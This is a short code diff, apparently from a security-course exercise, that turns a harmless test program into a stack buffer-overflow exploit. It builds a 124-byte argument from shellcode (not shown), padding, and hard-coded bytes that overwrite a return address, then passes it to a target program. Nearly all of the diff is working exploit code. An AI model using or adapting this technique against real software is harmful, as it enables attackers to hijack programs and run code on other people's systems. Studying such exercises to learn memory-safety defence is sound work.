@@ -12,8 +12,22 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
+	char large_string[124];
+	int i;
+	for(i = 0; i < strlen(shellcode); i++){
+		large_string[i] = shellcode[i];
+	}
+	for(i = strlen(shellcode); i < 120; i++){
+		large_string[i] = '0';
+	}
+	
+	large_string[120] = '\x10';
+	large_string[121] = '\xfe';
+	large_string[122] = '\x21';
+	large_string[123] = '\x20';
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = large_string; 
 	args[2] = NULL;
 
 	env[0] = NULL;
